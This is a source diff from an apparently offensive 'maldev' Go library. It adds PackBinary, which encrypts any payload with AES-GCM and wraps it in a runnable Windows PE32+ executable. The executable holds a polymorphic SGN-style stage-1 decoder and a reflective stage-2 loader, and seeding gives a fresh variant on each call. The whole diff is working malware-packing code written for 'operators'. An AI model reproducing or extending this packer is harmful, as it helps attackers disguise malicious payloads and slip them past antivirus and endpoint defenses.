@@ -1,20 +1,21 @@
 // Package packer is maldev's custom PE/ELF packer.
 //
-// Today the package ships only the encrypt + embed pipeline:
-// [Pack] takes any byte buffer and produces a self-describing
-// maldev-format blob (header + AEAD-encrypted payload). [Unpack]
-// reverses the pipeline given the key. The blob is NOT runnable
-// as a PE; the reflective loader stub that wraps the blob into
-// a runnable PE/ELF lands in a follow-up phase.
+// [Pack] / [Unpack] handle the encrypt-only pipeline (Phase 1c+).
+// [PackBinary] is the operator-facing entry point added in Phase 1e-A:
+// it wraps a payload in a runnable Windows PE32+ host containing a
+// polymorphic SGN-style stage-1 decoder and a reflective stage-2 loader.
+// No go build or system toolchain is required at pack time.
 //
 // Design + roadmap: docs/refactor-2026-doc/packer-design.md.
 package packer
 
 import (
+	"errors"
 	"fmt"
 
 	"github.com/oioio-space/maldev/crypto"
 	"github.com/oioio-space/maldev/pe/packer/internal/elfgate"
+	"github.com/oioio-space/maldev/pe/packer/stubgen"
 )
 
 // Options tunes [Pack]. The zero value selects sensible defaults
@@ -74,6 +75,109 @@ func Pack(data []byte, opts Options) (packed []byte, key []byte, err error) {
 	}).marshalInto(out)
 	copy(out[HeaderSize:], body)
 	return out, key, nil
+}
+
+// Format selects the host binary shape PackBinary emits. Phase 1e-A
+// only supports FormatWindowsExe; other formats land in 1e-B/C/D/E.
+type Format uint8
+
+const (
+	FormatUnknown    Format = iota // zero value; rejected by PackBinary
+	FormatWindowsExe               // PE32+ Windows executable
+)
+
+// String returns the canonical lowercase format name.
+func (f Format) String() string {
+	switch f {
+	case FormatWindowsExe:
+		return "windows-exe"
+	default:
+		return fmt.Sprintf("format(%d)", uint8(f))
+	}
+}
+
+// PackBinaryOptions parameterizes [PackBinary].
+type PackBinaryOptions struct {
+	// Format selects the host binary shape. Only FormatWindowsExe is
+	// supported today; FormatUnknown (zero) is always rejected.
+	Format Format
+
+	// Pipeline is the Phase 1c+ encryption pipeline applied to the
+	// inner payload before embedding it in the stage-2 binary.
+	// When nil, a single AES-GCM step is used.
+	Pipeline []PipelineStep
+
+	// Stage1Rounds is the number of SGN encoding rounds applied to
+	// the stage-2 blob. Defaults to 3 when zero. Valid range: 1..10.
+	Stage1Rounds int
+
+	// Seed drives the poly engine and the stage-2 variant selector.
+	// Zero means crypto-random, producing a fresh variant each call.
+	Seed int64
+}
+
+// ErrUnsupportedFormat fires when [PackBinary] is asked for a format
+// not yet implemented. Phase 1e-B/C/D/E extend the Format enum.
+var ErrUnsupportedFormat = errors.New("packer: unsupported format")
+
+// PackBinary wraps a target payload in a runnable Windows PE32+ host
+// with a polymorphic stage-1 decoder and a reflective stage-2 loader.
+//
+// Pure Go: no go build, no system toolchain at pack-time.
+//
+// Pipeline:
+//  1. [PackPipeline] encrypts the payload (default: single AES-GCM step).
+//  2. [stubgen.PickStage2Variant] selects a committed stage-2 binary.
+//  3. [stubgen.PatchStage2] appends the encrypted payload + key trailer.
+//  4. [stubgen.Generate] runs SGN rounds and emits the host PE32+.
+//
+// Sentinels: [ErrUnsupportedFormat], [stubgen.ErrInvalidRounds],
+// [stubgen.ErrPayloadTooLarge], [stubgen.ErrEncodingSelfTestFailed].
+func PackBinary(payload []byte, opts PackBinaryOptions) (host []byte, key []byte, err error) {
+	if opts.Format != FormatWindowsExe {
+		return nil, nil, fmt.Errorf("%w: %s", ErrUnsupportedFormat, opts.Format)
+	}
+	rounds := opts.Stage1Rounds
+	if rounds == 0 {
+		rounds = 3
+	}
+
+	pipeline := opts.Pipeline
+	if pipeline == nil {
+		// AES-GCM is the safe, well-tested default; operators with
+		// entropy-cover or multi-cipher requirements pass Pipeline
+		// explicitly.
+		pipeline = []PipelineStep{{Op: OpCipher, Algo: uint8(CipherAESGCM)}}
+	}
+	encryptedPayload, keys, err := PackPipeline(payload, pipeline)
+	if err != nil {
+		return nil, nil, fmt.Errorf("packer: PackPipeline: %w", err)
+	}
+	// PackPipeline returns one key per step; PackBinary exposes the
+	// first key. Operators needing per-step keys should call PackPipeline
+	// directly.
+	key = keys[0]
+
+	stage2, err := stubgen.PickStage2Variant(opts.Seed)
+	if err != nil {
+		return nil, nil, fmt.Errorf("packer: %w", err)
+	}
+
+	inner, err := stubgen.PatchStage2(stage2, encryptedPayload, key)
+	if err != nil {
+		return nil, nil, fmt.Errorf("packer: PatchStage2: %w", err)
+	}
+
+	host, err = stubgen.Generate(stubgen.Options{
+		Inner:  inner,
+		Rounds: rounds,
+		Seed:   opts.Seed,
+	})
+	if err != nil {
+		return nil, nil, fmt.Errorf("packer: stubgen.Generate: %w", err)
+	}
+
+	return host, key, nil
 }
 
 // ValidateELF returns nil when elf is a Go static-PIE binary
